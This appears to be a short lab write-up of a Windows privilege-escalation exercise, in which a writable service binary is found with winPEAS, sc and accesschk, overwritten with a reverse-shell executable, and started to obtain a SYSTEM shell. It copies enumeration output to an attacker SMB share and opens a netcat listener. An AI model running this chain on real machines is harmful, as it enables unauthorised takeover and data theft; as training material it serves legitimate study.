1x4 Service - Insecure Service Executable

## Service - Insecure Service Executable

```bash
.\winPEASany.exe ansi quiet servicesinfo > wpeas_services_op.txt
copy C:\PrivEsc\wpeas_services_op.txt \\10.9.4.127\kali\wpeas_services_op.txt
cat wpeas_services_op.txt
```
Identified 1 service mis-configuration

![2776bbe04300e594faf70903b244e6cf.png](../_resources/d21a815d71ad46ed9e03d2117ec88e37.png)

```bash
sc qc filepermsvc
```

![38a212ac759b73c19bbb7b244bffe45b.png](../_resources/72672bcacf7a4331b4b687405105964f.png)

```bash
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```

![bcdd9f485b6bc3c2cc8413358a52e9ea.png](../_resources/63910ff531f14cc683862f82c2dd2f19.png)

```bash
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
```

![49ac77b9800dfba1c0f5239aa7a78f90.png](../_resources/9689801096f5479c9ce2aaef96eb4b5d.png)

```bash
sudo nc -nvlp 53
net start filepermsvc
```

![7564198c69e7cc276ac6de947e35a4fb.png](../_resources/edaf1424715c465abf1d5043f4e8b438.png)

**Got the system**

![299008897dc7dfe9587362477832ff65.png](../_resources/d0a839ba79ed4e308e594802fa0567b0.png)
